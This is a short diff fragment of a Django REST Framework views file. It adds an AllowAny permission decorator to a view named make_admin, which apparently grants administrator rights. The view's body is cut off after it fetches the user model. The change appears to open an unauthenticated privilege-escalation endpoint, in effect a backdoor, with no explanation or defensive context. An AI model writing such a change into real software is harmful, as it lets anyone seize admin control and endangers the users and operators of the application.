@@ -50,6 +50,7 @@ def delete_my_account(request):
     return Response({'status': 'Account and all associated data permanently deleted.'}, status=status.HTTP_200_OK)
 
 @api_view(['POST'])
+@permission_classes([AllowAny])
 def make_admin(request):
     from django.contrib.auth import get_user_model
     User = get_user_model()
